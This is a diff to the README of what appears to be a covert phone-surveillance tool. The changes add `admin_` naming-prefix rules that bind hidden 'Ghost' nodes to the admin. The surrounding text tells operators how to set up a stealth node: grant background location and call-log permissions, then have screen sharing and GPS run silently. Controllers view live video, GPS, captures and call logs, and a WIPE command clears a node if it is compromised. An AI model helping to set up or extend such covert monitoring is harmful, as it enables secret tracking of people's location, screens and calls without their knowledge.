@@ -33,6 +33,7 @@ graph TD
 - **Initialization**: Login as `admin` with the `ADMIN_SECRET_KEY`.
 - **Command Loop**: Select a Ghost from the horizontal "Node Selector".
 - **Operation**: Switch between **FEED** (Live Video), **MAP** (GPS), **SNAPS** (Captures), **CALLS** (Logs), and **LOGS** (System updates).
+- **Dual Role**: The Admin automatically acts as a Viewer. Any Ghost node named with the prefix `admin_` (e.g., `admin_MyNode`) will be exclusively bound to the Admin's internal viewer-context.
 - **Intervention**: Trigger `SNAPSHOT` for proof or `WIPE` to clear the node if compromised.
 
 ### 2. The Viewer (Field Monitor)
@@ -43,8 +44,9 @@ graph TD
 
 ### 3. The Ghost (Stealth Node)
 **Objective**: Background telemetry and stream projection.
+- **Prefix Rule**: Prefix must match an Active Viewer or be `admin_` to bind specifically to the Master Controller.
 - **Workflow**:
-    1. Login with `VIEWERNAME_Suffix`.
+    1. Login with `VIEWERNAME_Suffix` or `admin_Suffix`.
     2. Click **CALIBRATE** to initialize Media Projection.
     3. Grant **Background Location** and **Call Log** permissions.
     4. Screen Sharing/GPS runs silently in the background via `TaskManager`.
